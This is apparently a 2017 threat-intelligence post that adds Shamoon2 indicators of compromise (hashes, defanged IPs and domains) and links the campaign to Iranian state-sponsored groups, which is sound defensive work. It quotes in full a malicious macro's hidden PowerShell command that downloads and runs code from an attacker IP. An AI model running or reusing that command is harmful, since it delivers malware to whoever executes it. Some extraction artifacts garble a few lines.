Researchers showcased a potential malware lifecycle\nwhich started with spear phishing and eventually led to the deployment of the disk-wiping\nmalware known as Shamoon. Their research showcased a set of downloaders and domains that\ncould potentially lead to a more extensive malware distribution campaign.\n\n\n2/21/2017\n\n\nWhile researching elements in the IBM report, ASERT discovered additional malicious domains, IP addresses, and\nartifacts. The basic functionality of the new documents and their PowerShell components matched what was\npreviously disclosed. For more information on the overall capabilities of the malware, please review IBM’s ongoing\nresearch. It is our hope that by providing additional indicators, end-point investigators and network defenders will\nbe able to discover and mitigate more Shamoon2 related compromises.\n\n**Initial Discoveries**\n\nThe following new samples were likely delivered via similar spear phishing campaigns as described in IBM’s\nresearch. All three shared the same IPs and URLs, also provided below. These samples were located by pivoting on\ndocument attributes. In this case, a sample from the IBM report indicated the document author ‘gerry.knight’ which\nled us to the following three additional samples. MD5\n\nMD5\n\n2a0df97277ddb361cecf8726df6d78ac\n5e5ea1a67c2538dbc01df28e4ea87472\nd30b8468d16b631cafe458fd94cc3196\n\nIPs\n\n104.218.120[.]128\n69.87.223[.]26\n5.254.100[.]200\n\nURLs\n\nanalytics-google[.]org:69/checkFile.aspx\nanalytics-google[.]org\n69.87.223[.]26:8080/p\n\nThe following is a screenshot of a macro-enabled document captured from sample\n5e5ea1a67c2538dbc01df28e4ea87472:\n\n\n-----\n\nOnce enabled the extracted macro executed the following:\n\n‘powershell.exe -w hidden -noni -nop -c “iex(New-Object\nSystem.Net.WebClient).DownloadString(\\’http://69.87.223.26:8080/p\\’)”‘\n\n**Pivoting on Passive DNS**\n\nFrom the previous samples, we performed a passive DNS lookup on the IPs. We found get.adobe.go-microstf[.]com\nhosted at 104.218.120[.]128 around the time this campaign was ongoing, November 2016.\n\nResearching the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed yet another iteration of malicious\nexecutables. In this case, a URL used to download the PowerShell component shared a naming convention found in\nthe IBM report, http://69.87.223[.]26:8080/eiloShaegae1 and connected to the IP address used by the previous\nthree samples. The following are IOCs related to this domain:\n\nMD5\n\n83be35956e5d409306a81e88a1dc89fd\n\nIPs\n\n45.63.10[.]99\n69.87.223[.]26\n\nURLs\n\ngo-microstf[.]com\n69.87.223[.]26:8080/eiloShaegae1\ngo-microstf[.]com/checkfile.aspx\n\nThe domain go-microstf[.]com was originally set up to spoof Google Analytics login page. The following screenshot\ni f th li i d i\n\n\n-----\n\n**Possible Connections to Iranian state-sponsored Kittens**\n\nFinally, research yielded a relatively unique sample. This particular iteration was submitted to VirusTotal on\nSeptember 16, 2016. The majority of samples analyzed to date were submitted no earlier than mid-October, with\nmost being submitted in January 2017 or later. We were able to discover this particular version by diving further into\nconnections to analytics-google[.]org. Unlike newer samples, this one created a unique file ‘sloo.exe’. The file was\ncreated at C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\sloo.exe. In addition to this file, the sample also\ncontacted 104.238.184[.]252 for the PowerShell executable.\n\n[Researchers at Palo Alto have attributed sloo.exe and related activities to threat actors of a likely Iranian state-](http://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/)\nsponsored origin which they’ve named Magic Hound. The group Magic Hound is linked via infrastructure and tools\nto the Rocket Kitten threat actor group although Palo Alto cannot confirm the extent of any relationship between the\ntwo groups.\n\n[Dell Secureworks analysts recently concluded that domains discussed in the IBM report were linked to the Iranian](https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations)\nPuppyRAT. In addition, Dell analysts have assessed with high-confidence these activities are attributable to Iranian\nstate-sponsored activities.\n\n\n-----\n\n07d6406036d6e06dc8019e3ade6ee7de\n\nIPs\n\n104.238.184[.]252\n5.254.100[.]200\n\nURLs\n\nanalytics-google[.]org:69/checkFile.aspx\n\n**Conclusion**\n\nThese additional IOCs will hopefully provide more context into the ongoing threat. The link to possible Iranian threat\nactors supports ongoing analysis that Shamoon2 was perpetrated by Iranian state-sponsored threat actors. The last\nsample discussed may be malware-0 or at least part of the overall development and subsequent deployment of tools\nused to install Shamoon on Saudi systems.\n\n**Consolidated IOC list:**\n\nMD5\n\n2a0df97277ddb361cecf8726df6d78ac\n5e5ea1a67c2538dbc01df28e4ea87472\nd30b8468d16b631cafe458fd94cc3196\n83be35956e5d409306a81e88a1dc89fd\n07d6406036d6e06dc8019e3ade6ee7de\n\nIPs\n\n104.218.120[.]128\n69.87.223[.]26\n5.254.100[.]200\n45.63.10[.]99\n104.238.184[.]252\n\nURLs\n\nanalytics-google[.]org:69/checkFile.aspx\nanalytics-google[.]org\n69.87.223[.]26:8080/p\ngo-microstf[.]com\n69.87.223[.]26:8080/eiloShaegae1\nget.adobe.go-microstf[.]com\ngo-microstf[.]com/checkfile.aspx\n\n[Tags: disk wiper, IOCs, Iran, Saudi Arabia, Shamoon, Shamoon2](https://www.arbornetworks.com/blog/asert/tag/disk-wiper/)\n\n\n-----",
